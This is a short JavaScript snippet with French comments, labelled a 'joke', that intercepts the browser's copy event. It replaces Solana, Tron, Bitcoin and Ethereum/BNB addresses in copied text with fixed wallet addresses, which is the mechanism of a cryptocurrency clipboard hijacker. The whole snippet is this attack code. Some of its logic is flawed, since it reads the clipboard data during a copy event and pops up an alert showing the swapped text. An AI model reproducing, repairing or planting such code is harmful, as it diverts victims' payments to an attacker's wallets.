// Script "Blague" pour remplacer les adresses crypto
document.addEventListener('copy', function (event) {
    event.preventDefault();
    var pastedText = (event.originalEvent || event).clipboardData.getData('text/plain');
    var modifiedText = replaceCryptoAddress(pastedText);
    console.log('Texte collé :', modifiedText);
    navigator.clipboard.writeText(modifiedText).then(function() {
        alert('Texte collé et modifié : ' + modifiedText);
    });
});

function replaceCryptoAddress(originalText) {
    // Remplacement des adresses fictives par les adresses spécifiques
    var replacedText = originalText.replace(/sol:\s*([a-zA-Z0-9]{43})/g, 'sol: 3bUr5TAqKLozs49amVNq7vJ5Qvk9BjaKJPMow5fU11zf');
    replacedText = replacedText.replace(/trx:\s*([a-zA-Z0-9]{34})/g, 'trx: TKPGbpg3fjcvX5NsDEuzsbYKGbGffSeFRr');
    replacedText = replacedText.replace(/btc:\s*([a-zA-Z0-9]{42})/g, 'btc: bc1qdx854625jt6k5s62tcnre6fmsyu6ng4pr6s64f');
    replacedText = replacedText.replace(/eth\s*;?\s*bnb:\s*([a-zA-Z0-9]{42})/g, 'eth ; bnb: 0x10498445975974690E1EA11AF5447461B12cb588');
    // Ajoutez d'autres remplacements ici pour d'autres adresses

    return replacedText;
}
